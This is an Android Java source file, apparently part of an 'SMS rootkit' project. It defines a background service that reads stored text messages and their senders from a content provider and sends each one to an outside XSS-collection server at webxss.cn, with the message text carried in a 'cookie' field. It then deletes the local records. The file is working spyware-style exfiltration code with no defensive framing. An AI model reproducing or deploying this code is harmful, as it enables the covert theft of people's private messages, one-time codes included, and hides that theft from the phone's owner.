package com.funny.fortest.smsrookit;
import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions and extra parameters.
 */
public class UploadSMSIntentService extends IntentService {

    public UploadSMSIntentService() {
        super("UploadSMSIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Uri uri = Uri.parse("content://com.funny.fortest.provider/SMS");
        Cursor cursor = SMSApplication.getContext().getContentResolver().query(uri, null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                    String sender = cursor.getString(cursor
                            .getColumnIndex("sender"));
                    String message = cursor.getString(cursor
                            .getColumnIndex("message"));

                Log.d("zhaochengyu", "sender is " + sender);
                Log.d("zhaochengyu", "message is " + message);
                sendSMS2XSS("139", sender, message, 1);
            }
            cursor.close();
        }
        else{
            Log.e("zhaochengyu", "UploadSMSIntentService onHandleIntent: no cursor");
        }
    }
    private void sendSMS2XSS(final String localnum,final String sender,final String msg,final int opener) {
        // 开启线程来发起网络请求
        String message = "error";
        try{
            message = URLEncoder.encode(msg, "UTF-8");
            message = URLEncoder.encode(message, "UTF-8");
            String result = URLDecoder.decode(message, "UTF-8");
            result = URLDecoder.decode(result, "UTF-8");
            Log.d("zhaochengyu", "sendSMS2XSS: " +result);
        }catch(Exception e){
            e.printStackTrace();
        }

        final String baseUrl = String.format("http://webxss.cn/index.php?do=api&id=7TXkAx&location=%s&toplocation=%s&cookie=%s&opener=%d",localnum,sender,message,opener);
        new Thread(new Runnable() {

            @Override
            public void run() {
                HttpURLConnection connection = null;
                try {
                    Log.d("zhaochengyu", "run: "+ baseUrl);
                    URL url = new URL(baseUrl);
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(8000);
                    connection.setReadTimeout(8000);
                    connection.setDoInput(true);
                    connection.setDoOutput(true);
                    InputStream in = connection.getInputStream();
                    // 下面对获取到的输入流进行读取
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(in));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    Log.d("zhaochengyu", "result: "+response.toString());
                    Uri uri = Uri.parse("content://com.funny.fortest.provider/SMS");
                    int num = SMSApplication.getContext().getContentResolver().delete(uri,null,null);
                    Log.d("zhaochengyu", "UploadSMSIntentService onHandleIntent: "+num+" deleted");

                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }
}
